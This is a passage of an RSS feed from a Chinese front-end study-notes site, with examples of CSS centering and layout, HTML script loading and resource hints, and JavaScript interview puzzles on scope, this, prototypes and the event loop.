  <span>position</span><span>:</span> absolute<span>;</span>
  <span>top</span><span>:</span> 0<span>;</span>
  <span>right</span><span>:</span> 0<span>;</span>
  <span>bottom</span><span>:</span> 0<span>;</span>
  <span>left</span><span>:</span> 0<span>;</span>
  <span>margin</span><span>:</span> auto<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div></li>
<li>
<ol start="3">
<li>flex</li>
</ol>
<div><pre><code><span>.parent</span> <span>{</span>
  <span>display</span><span>:</span> flex<span>;</span>
<span>}</span>
<span>.son</span> <span>{</span>
  <span>margin</span><span>:</span> auto<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></div></div><div><pre><code><span>.parent</span> <span>{</span>
  <span>display</span><span>:</span> flex<span>;</span>
  <span>align-items</span><span>:</span> center<span>;</span>
  <span>justify-content</span><span>:</span> center<span>;</span>
<span>}</span>
<span>.son</span> <span>{</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></div></div><div><pre><code><span>.parent</span> <span>{</span>
  <span>display</span><span>:</span> flex<span>;</span>
  <span>justify-content</span><span>:</span> center<span>;</span>
<span>}</span>
<span>.son</span> <span>{</span>
  <span>align-items</span><span>:</span> center<span>;</span>

  <span>/* align-self: center; */</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br></div></div></li>
<li>
<ol start="4">
<li>grid</li>
</ol>
<div><pre><code><span>.parent</span> <span>{</span>
  <span>display</span><span>:</span> grid<span>;</span>
<span>}</span>
<span>.son</span> <span>{</span>
  <span>margin</span><span>:</span> auto<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></div></div><div><pre><code><span>.parent</span> <span>{</span>
  <span>display</span><span>:</span> grid<span>;</span>
  <span>place-items</span><span>:</span> center<span>;</span>

  <span>/* place-content: center; */</span>

  <span>/* justify-items: center;
  align-items: center; */</span>

  <span>/* justify-content: center;
  align-content: center; */</span>
<span>}</span>
<span>.son</span> <span>{</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br></div></div><div><pre><code><span>.parent</span> <span>{</span>
  <span>display</span><span>:</span> grid<span>;</span>
<span>}</span>
<span>.son</span> <span>{</span>
  <span>place-self</span><span>:</span> center<span>;</span>

  <span>/* justify-self: center;
  align-self: center; */</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br></div></div></li>
<li>
<p><a href="https://juejin.cn/post/6844903574929932301#heading-19" target="_blank" rel="noopener noreferrer">干货!各种常见布局实现+知名网站实例分析 - Sweet_KK</a></p>
</li>
</ul>
<h2 id="_3-移动端-1px"> 3. 移动端 1px</h2>
<div><pre><code><span>.box</span> <span>{</span>
  <span>width</span><span>:</span> 300px<span>;</span>
  <span>height</span><span>:</span> 300px<span>;</span>
  <span>position</span><span>:</span> relative<span>;</span>
<span>}</span>
<span>.box:after</span> <span>{</span>
  <span>content</span><span>:</span> <span>' '</span><span>;</span>
  <span>position</span><span>:</span> absolute<span>;</span>
  <span>top</span><span>:</span> 0<span>;</span>
  <span>left</span><span>:</span> 0<span>;</span>
  <span>width</span><span>:</span> 200%<span>;</span>
  <span>height</span><span>:</span> 200%<span>;</span>
  <span>transform</span><span>:</span> <span>scale</span><span>(</span>0.5<span>)</span><span>;</span>
  <span>transform-origin</span><span>:</span> left top<span>;</span>
  <span>box-sizing</span><span>:</span> border-box<span>;</span>
  <span>border</span><span>:</span> 1px solid #e5e5e5<span>;</span>
  <span>border-radius</span><span>:</span> 50% 10%<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br></div></div><ul>
<li><a href="https://maodoufe.github.io/1px/css/2019/07/01/1px.html" target="_blank" rel="noopener noreferrer">移动端 1px 解决方案 - 毛豆前端</a></li>
</ul>
<h2 id="_4-css-匹配规则"> 4. CSS 匹配规则</h2>
<ul>
<li>
<p>CSS 读取顺序：从右向左。</p>
<blockquote>
<p>css 渲染时会先找 p，然后再找 .box 下的 p（p 的性能要比 .box p 更好）。</p>
</blockquote>
</li>
</ul>
<div><pre><code><span>.box p</span> <span>{</span>
  <span>color</span><span>:</span> pink<span>;</span>
<span>}</span>

<span>p</span> <span>{</span>
  <span>color</span><span>:</span> pink<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></div></div><h2 id="_5-超越-important-超越最大"> 5. <a href="/note/books/CSS-World/#_8-超越-important-超越最大">超越!important，超越最大</a></h2>
<ul>
<li>最终宽度为 <code>700px</code>，<code>min-width</code> &gt; <code>max-width</code> &gt; <code>!important</code>。</li>
</ul>
<div><pre><code><span><span>&lt;!</span><span>DOCTYPE</span> <span>html</span><span>></span></span>
<span><span><span>&lt;</span>html</span> <span>lang</span><span><span>=</span><span>"</span>en<span>"</span></span><span>></span></span>
  <span><span><span>&lt;</span>head</span><span>></span></span>
    <span><span><span>&lt;</span>meta</span> <span>charset</span><span><span>=</span><span>"</span>UTF-8<span>"</span></span> <span>/></span></span>
    <span><span><span>&lt;</span>meta</span> <span>http-equiv</span><span><span>=</span><span>"</span>X-UA-Compatible<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>IE=edge<span>"</span></span> <span>/></span></span>
    <span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>"</span>viewport<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>width=device-width, initial-scale=1.0<span>"</span></span> <span>/></span></span>
    <span><span><span>&lt;</span>title</span><span>></span></span>Document<span><span><span>&lt;/</span>title</span><span>></span></span>
    <span><span><span>&lt;</span>style</span><span>></span></span><span><span>
      <span>.one-piece</span> <span>{</span>
        <span>min-width</span><span>:</span> 700px<span>;</span>
        <span>max-width</span><span>:</span> 600px<span>;</span>
      <span>}</span>
    </span></span><span><span><span>&lt;/</span>style</span><span>></span></span>
  <span><span><span>&lt;/</span>head</span><span>></span></span>
  <span><span><span>&lt;</span>body</span><span>></span></span>
    <span><span><span>&lt;</span>img</span>
      <span>src</span><span><span>=</span><span>"</span>https://www.coderljw.ga/images/海贼王.png<span>"</span></span>
      <span><span>style</span><span><span>=</span><span>"</span><span><span>width</span><span>:</span> 500px <span>!important</span></span><span>"</span></span></span>
      <span>class</span><span><span>=</span><span>"</span>one-piece<span>"</span></span>
    <span>/></span></span>
  <span><span><span>&lt;/</span>body</span><span>></span></span>
<span><span><span>&lt;/</span>html</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Flutter</title>
      <link>https://www.matrixtheone.ga/web/memo/Flutter/</link>
      <guid>https://www.matrixtheone.ga/web/memo/Flutter/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">Flutter</source>
      <category>Flutter</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
    </item>
    <item>
      <title>HTML</title>
      <link>https://www.matrixtheone.ga/web/memo/HTML/</link>
      <guid>https://www.matrixtheone.ga/web/memo/HTML/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">HTML</source>
      <category>HTML</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-defer-与-async"> 1. defer 与 async</h2>
<ul>
<li>
<p>默认：script 同步加载后直接执行。会阻塞 HTML 解析，导致白屏问题。</p>
</li>
<li>
<p>defer：script 异步加载最后执行。不会阻塞 HTML 解析，会在 DOMContentLoaded 事件（DOM 解析完成）之前执行 script。多个 defer script 会按顺序执行。</p>
</li>
<li>
<p>async：script 异步加载直接执行。或许会阻塞 HTML 解析，取决于加载完成后 HTML 是否解析完成。多个 async script 执行顺序不确定。</p>
<img :src="$withBase('/images/HTML/defer和async的区别.jpg')" loading="lazy">
</li>
</ul>
<h2 id="_2-dns-prefetch、preconnect、preload、prefetch、prerender"> 2. dns-prefetch、preconnect、preload、prefetch、prerender</h2>
<ul>
<li>
<p>dns-prefetch：提前解析域名，节省 DNS 解析时间。</p>
<div><pre><code><span>&lt;!-- HTTPS 开启on/关闭off DNS 自动预解析 --></span>
<span><span><span>&lt;</span>meta</span> <span>http-equiv</span><span><span>=</span><span>"</span>x-dns-prefetch-control<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>on<span>"</span></span> <span>/></span></span>

<span><span><span>&lt;</span>link</span> <span>rel</span><span><span>=</span><span>"</span>dns-prefetch<span>"</span></span> <span>href</span><span><span>=</span><span>"</span>//cdn.domain.com<span>"</span></span> <span>/></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></div></div></li>
<li>
<p>preconnect：提前建立链接，节省 DNS -&gt; TCP -&gt; TLS（HTTPS 情况下）请求时间。</p>
<div><pre><code><span><span><span>&lt;</span>link</span> <span>rel</span><span><span>=</span><span>"</span>preconnect<span>"</span></span> <span>href</span><span><span>=</span><span>"</span>https://fonts.gstatic.com/<span>"</span></span> <span>crossorigin</span> <span>/></span></span>
</code></pre>
<div><span>1</span><br></div></div></li>
<li>
<p>preload：影响当前页面的资源加载顺序，提升了资源加载的优先级（不会阻塞页面渲染及 load 事件）。</p>
<div><pre><code><span><span><span>&lt;</span>link</span> <span>rel</span><span><span>=</span><span>"</span>preload<span>"</span></span> <span>href</span><span><span>=</span><span>"</span>image.png<span>"</span></span> <span>/></span></span>

<span><span><span>&lt;</span>link</span>
  <span>rel</span><span><span>=</span><span>"</span>preload<span>"</span></span>
  <span>href</span><span><span>=</span><span>"</span>https://example.com/fonts/font.woff<span>"</span></span>
  <span>as</span><span><span>=</span><span>"</span>font<span>"</span></span>
  <span>crossorigin</span>
<span>/></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br></div></div></li>
<li>
<p>prefetch：在浏览器空闲时加载资源，用于加载未来（如下一个页面）会用到的资源。</p>
<div><pre><code><span><span><span>&lt;</span>link</span> <span>rel</span><span><span>=</span><span>"</span>prefetch<span>"</span></span> <span>href</span><span><span>=</span><span>"</span>/uploads/images/pic.png<span>"</span></span> <span>/></span></span>
<span><span><span>&lt;</span>link</span>
  <span>rel</span><span><span>=</span><span>"</span>prefetch<span>"</span></span>
  <span>as</span><span><span>=</span><span>"</span>script<span>"</span></span>
  <span>href</span><span><span>=</span><span>"</span>//cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js<span>"</span></span>
<span>/></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></div></div></li>
<li>
<p>prerender：提前加载并在后台渲染整个页面。</p>
<div><pre><code><span><span><span>&lt;</span>link</span> <span>rel</span><span><span>=</span><span>"</span>prerender<span>"</span></span> <span>href</span><span><span>=</span><span>"</span>https://www.keycdn.com<span>"</span></span> <span>/></span></span>
</code></pre>
<div><span>1</span><br></div></div></li>
<li>
<p><a href="https://github.com/fi3ework/blog/issues/32" target="_blank" rel="noopener noreferrer">[译] 资源提示 —— 什么是 Preload，Prefetch 和 Preconnect？ - fi3ework</a></p>
</li>
<li>
<p><a href="https://github.com/amandakelake/blog/issues/50" target="_blank" rel="noopener noreferrer">【性能优化】DNS 预解析 - amandakelake</a></p>
</li>
<li>
<p><a href="https://juejin.cn/post/6844903492490887182" target="_blank" rel="noopener noreferrer">预加载系列一：DNS Prefetching 的正确使用姿势 - 有赞前端</a></p>
</li>
</ul>
<h2 id="_3-table-和-iframe"> 3. table 和 iframe</h2>
<ul>
<li>
<p>table 标签会阻碍渲染引擎的渲染顺序。当所有内容渲染完成后 table 标签才会开始渲染，造成页面的回流和重绘，影响页面加载速度。</p>
<blockquote>
<p>table 中的一个元素结构改变后，会影响整个 table，增加回流重绘。</p>
</blockquote>
</li>
<li>
<p>iframe 会阻塞 load 事件。浏览器要等到所有的 iframe 加载完成才会触发 onload。</p>
<blockquote>
<p>影响用户体验，不利于 SEO。</p>
</blockquote>
</li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>面试</title>
      <link>https://www.matrixtheone.ga/web/memo/Interview/</link>
      <guid>https://www.matrixtheone.ga/web/memo/Interview/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">面试</source>
      <category>面试</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-执行上下文"> 1. 执行上下文</h2>
<div><pre><code><span>var</span> name <span>=</span> <span>'Smith'</span> <span>// 函数参数作用域或内部作用域有 name 声明，不会查找此处作用域上的 name</span>

<span>;</span><span>(</span><span>function</span> <span>(</span><span>name</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span>name<span>)</span> <span>// => 输出 [Function name]，函数声明优先级高于 var 声明，函数内部的 var name 声明会被忽略</span>
  <span>var</span> name <span>=</span> <span>'Neo'</span> <span>// var name 声明被忽略，name = 'Neo' 执行</span>
  <span>function</span> <span>name</span><span>(</span><span>)</span> <span>{</span><span>}</span> <span>// 声明提升</span>
  console<span>.</span><span>log</span><span>(</span>name<span>)</span> <span>// => 'Neo'</span>
<span>}</span><span>)</span><span>(</span><span>'Trinity'</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br></div></div><h2 id="_2-运算符优先级"> 2. 运算符优先级</h2>
<div><pre><code><span>var</span> a <span>=</span> <span>{</span> <span>n</span><span>:</span> <span>1</span> <span>}</span>
<span>var</span> b <span>=</span> a
b<span>.</span>x <span>=</span> a <span>=</span> <span>{</span> <span>n</span><span>:</span> <span>2</span> <span>}</span>

console<span>.</span><span>log</span><span>(</span>a<span>.</span>x<span>)</span> <span>// => undefined</span>
console<span>.</span><span>log</span><span>(</span>b<span>.</span>x<span>)</span> <span>// => { n: 2 }</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></div></div><h2 id="_3-this"> 3. this</h2>
<div><pre><code><span>var</span> value <span>=</span> <span>1</span>
<span>var</span> foo <span>=</span> <span>{</span>
  <span>value</span><span>:</span> <span>2</span><span>,</span>
  <span>bar</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>this</span><span>.</span>value
  <span>}</span><span>,</span>
<span>}</span>

<span>// this 为 foo</span>
console<span>.</span><span>log</span><span>(</span>foo<span>.</span><span>bar</span><span>(</span><span>)</span><span>)</span> <span>// => 2</span>
<span>// (foo.bar) 不会进行计算，this 为 foo</span>
console<span>.</span><span>log</span><span>(</span><span>(</span>foo<span>.</span>bar<span>)</span><span>(</span><span>)</span><span>)</span> <span>// => 2</span>
<span>// 以下使用了 GetValue，this 在严格模式为 undefined，在非严格模式隐式转为全局对象（可以理解为在全局执行 bar()）</span>
console<span>.</span><span>log</span><span>(</span><span>(</span>foo<span>.</span>bar <span>=</span> foo<span>.</span>bar<span>)</span><span>(</span><span>)</span><span>)</span> <span>// => 1</span>
console<span>.</span><span>log</span><span>(</span><span>(</span><span>false</span> <span>||</span> foo<span>.</span>bar<span>)</span><span>(</span><span>)</span><span>)</span> <span>// => 1</span>
console<span>.</span><span>log</span><span>(</span><span>(</span>foo<span>.</span>bar<span>,</span> foo<span>.</span>bar<span>)</span><span>(</span><span>)</span><span>)</span> <span>// => 1</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br></div></div><ul>
<li><a href="https://github.com/mqyqingfeng/Blog/issues/7" target="_blank" rel="noopener noreferrer">JavaScript 深入之从 ECMAScript 规范解读 this - 冴羽</a></li>
</ul>
<h2 id="_4-具名自执行函数"> 4. 具名自执行函数</h2>
<div><pre><code><span>;</span><span>(</span><span>function</span> <span>foo</span><span>(</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span>foo<span>)</span> <span>// => [Function foo]</span>
  foo <span>=</span> <span>777</span>
  console<span>.</span><span>log</span><span>(</span>window<span>.</span>foo<span>)</span> <span>// => undefined</span>
  console<span>.</span><span>log</span><span>(</span>foo<span>)</span> <span>// => [Function foo]</span>
<span>}</span><span>)</span><span>(</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></div></div><ul>
<li><a href="https://segmentfault.com/q/1010000002810093" target="_blank" rel="noopener noreferrer">在 JavaScript 的立即执行的具名函数 A 内修改 A 的值时到底发生了什么？ - Foolyou</a></li>
</ul>
<h2 id="_5-作用域"> 5. 作用域</h2>
<div><pre><code><span>var</span> x <span>=</span> <span>1</span>
<span>function</span> <span>f</span><span>(</span>x<span>,</span> <span>y</span> <span>=</span> <span>function</span> <span>(</span><span>)</span> <span>{</span> x <span>=</span> <span>3</span><span>;</span> console<span>.</span><span>log</span><span>(</span>x<span>)</span><span>;</span> <span>}</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span>x<span>)</span>
  <span>var</span> x <span>=</span> <span>2</span>
  <span>y</span><span>(</span><span>)</span>
  console<span>.</span><span>log</span><span>(</span>x<span>)</span>
<span>}</span>

<span>f</span><span>(</span><span>)</span>
console<span>.</span><span>log</span><span>(</span>x<span>)</span>

<span>// 依次打印：undefined -> 3 -> 2 -> 1</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><div><p>提示</p>
<img :src="$withBase('/images/JavaScript/作用域.png')" loading="lazy">
</div>
<ul>
<li><a href="https://juejin.cn/post/7030425359392882695" target="_blank" rel="noopener noreferrer">看似简单的题，席卷几十个前端群，王红元老师都亲自出面解答 - 林三心</a></li>
</ul>
<h2 id="_6-原型链"> 6. 原型链</h2>
<div><pre><code><span>function</span> <span>Foo</span><span>(</span><span>)</span> <span>{</span>
  <span>getName</span> <span>=</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>1</span><span>)</span>
  <span>}</span>
  <span>return</span> <span>this</span>
<span>}</span>

Foo<span>.</span><span>getName</span> <span>=</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>2</span><span>)</span>
<span>}</span>

<span>Foo</span><span>.</span>prototype<span>.</span><span>getName</span> <span>=</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>3</span><span>)</span>
<span>}</span>

<span>var</span> <span>getName</span> <span>=</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>4</span><span>)</span>
<span>}</span>

<span>function</span> <span>getName</span><span>(</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>5</span><span>)</span>
<span>}</span>

Foo<span>.</span><span>getName</span><span>(</span><span>)</span> <span>// => 2</span>
<span>getName</span><span>(</span><span>)</span> <span>// => 4</span>
<span>Foo</span><span>(</span><span>)</span><span>.</span><span>getName</span><span>(</span><span>)</span> <span>// => 1</span>
<span>getName</span><span>(</span><span>)</span> <span>// => 1</span>
<span>new</span> <span>Foo<span>.</span>getName</span><span>(</span><span>)</span> <span>// => 2</span>
<span>new</span> <span>Foo</span><span>(</span><span>)</span><span>.</span><span>getName</span><span>(</span><span>)</span> <span>// => 3</span>
<span>new</span> <span>new</span> <span>Foo</span><span>(</span><span>)</span><span>.</span><span>getName</span><span>(</span><span>)</span> <span>// => 3</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br></div></div><h2 id="_7-事件循环-event-loop"> 7. 事件循环（Event Loop）</h2>
<ul>
<li>
<p>如果 async2 返回的不是 promise，await 后续代码会直接注册到微任务队列中。</p>
<div><pre><code><span>async</span> <span>function</span> <span>async1</span><span>(</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>'async1 start'</span><span>)</span>
  <span>await</span> <span>async2</span><span>(</span><span>)</span>
  console<span>.</span><span>log</span><span>(</span><span>'async1 end'</span><span>)</span>
<span>}</span>

<span>async</span> <span>function</span> <span>async2</span><span>(</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>'async2'</span><span>)</span>
<span>}</span>

console<span>.</span><span>log</span><span>(</span><span>'script start'</span><span>)</span>

<span>setTimeout</span><span>(</span><span>function</span> <span>(</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>'setTimeout'</span><span>)</span>
<span>}</span><span>)</span>

<span>async1</span><span>(</span><span>)</span>

<span>new</span> <span>Promise</span><span>(</span><span>function</span> <span>(</span><span>resolve</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>'promise1'</span><span>)</span>
  <span>resolve</span><span>(</span><span>)</span>
<span>}</span><span>)</span><span>.</span><span>then</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>'promise2'</span><span>)</span>
<span>}</span><span>)</span>

console<span>.</span><span>log</span><span>(</span><span>'script end'</span><span>)</span>

<span>/*
依次打印：'script start' -> 'async1 start' -> 'async2' -> 'promise1' ->
'script end' -> 'async1 end' -> 'promise2' -> 'setTimeout'
*/</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br></div></div></li>
<li>
<p>如果 async2 返回的是 promise，await 后续代码不会直接注册到微任务队列中。</p>
<div><pre><code><span>async</span> <span>function</span> <span>async1</span><span>(</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>'async1 start'</span><span>)</span>
  <span>await</span> <span>async2</span><span>(</span><span>)</span>
  console<span>.</span><span>log</span><span>(</span><span>'async1 end'</span><span>)</span>
<span>}</span>

<span>async</span> <span>function</span> <span>async2</span><span>(</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>'async2'</span><span>)</span>
  <span>return</span> Promise<span>.</span><span>resolve</span><span>(</span><span>)</span><span>.</span><span>then</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>'async2 return end'</span><span>)</span>
  <span>}</span><span>)</span>
<span>}</span>

console<span>.</span><span>log</span><span>(</span><span>'script start'</span><span>)</span>

<span>setTimeout</span><span>(</span><span>function</span> <span>(</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>'setTimeout'</span><span>)</span>
<span>}</span><span>)</span>

<span>async1</span><span>(</span><span>)</span>

<span>new</span> <span>Promise</span><span>(</span><span>function</span> <span>(</span><span>resolve</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>'promise1'</span><span>)</span>
  <span>resolve</span><span>(</span><span>)</span>
<span>}</span><span>)</span><span>.</span><span>then</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>'promise2'</span><span>)</span>
<span>}</span><span>)</span>

console<span>.</span><span>log</span><span>(</span><span>'script end'</span><span>)</span>

<span>/*
依次打印：'script start' -> 'async1 start' -> 'async2' -> 'promise1' ->
'script end' -> 'async2 return end' -> 'promise2' -> 'async1 end' -> 'setTimeout'
*/</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br></div></div><div><p>async1、async2 相当于如下代码</p>
<div><pre><code><span>async</span> <span>function</span> <span>async1</span><span>(</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>'async1 start'</span><span>)</span>
  <span>async2</span><span>(</span><span>)</span>
    <span>.</span><span>then</span><span>(</span><span>res</span> <span>=></span> <span>{</span>
      console<span>.</span><span>log</span><span>(</span>res<span>)</span>
    <span>}</span><span>)</span>
    <span>.</span><span>then</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
      console<span>.</span><span>log</span><span>(</span><span>'async1 end'</span><span>)</span>
    <span>}</span><span>)</span>
<span>}</span>

<span>async</span> <span>function</span> <span>async2</span><span>(</span><span>)</span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>'async2'</span><span>)</span>
  <span>return</span> <span>'async2 return end'</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br></div></div></div>
</li>
<li>
<p>then() 参数非函数时发生值穿透（非异步）。</p>
<div><pre><code><span>var</span> date <span>=</span> <span>new</span> <span>Date</span><span>(</span><span>)</span>

console<span>.</span><span>log</span><span>(</span><span>1</span><span>,</span> <span>new</span> <span>Date</span><span>(</span><span>)</span> <span>-</span> date<span>)</span>

<span>setTimeout</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
  console<span>.</span><span>log</span><span>(</span><span>2</span><span>,</span> <span>new</span> <span>Date</span><span>(</span><span>)</span> <span>-</span> date<span>)</span>
<span>}</span><span>,</span> <span>500</span><span>)</span>

Promise<span>.</span><span>resolve</span><span>(</span><span>)</span><span>.</span><span>then</span><span>(</span>console<span>.</span><span>log</span><span>(</span><span>3</span><span>,</span> <span>new</span> <span>Date</span><span>(</span><span>)</span> <span>-</span> date<span>)</span><span>)</span>

<span>// 阻塞线程</span>
<span>while</span> <span>(</span><span>new</span> <span>Date</span><span>(</span><span>)</span> <span>-</span> date <span>&lt;</span> <span>1000</span><span>)</span> <span>{</span><span>}</span>

console<span>.</span><span>log</span><span>(</span><span>4</span><span>,</span> <span>new</span> <span>Date</span><span>(</span><span>)</span> <span>-</span> date<span>)</span>

<span>// 依次打印：1 0 -> 3 0 -> 4 1000 -> 2 1000</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br></div></div></li>
</ul>
<h2 id="_8-dfs-bfs"> 8. DFS &amp; BFS</h2>
<div><pre><code><span>class</span> <span>Node</span> <span>{</span>
  <span>constructor</span><span>(</span><span>val<span>,</span> left <span>=</span> <span>null</span><span>,</span> right <span>=</span> <span>null</span></span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>val <span>=</span> val
    <span>this</span><span>.</span>left <span>=</span> left
    <span>this</span><span>.</span>right <span>=</span> right
  <span>}</span>
<span>}</span>

<span>const</span> root <span>=</span> <span>new</span> <span>Node</span><span>(</span>
  <span>1</span><span>,</span>
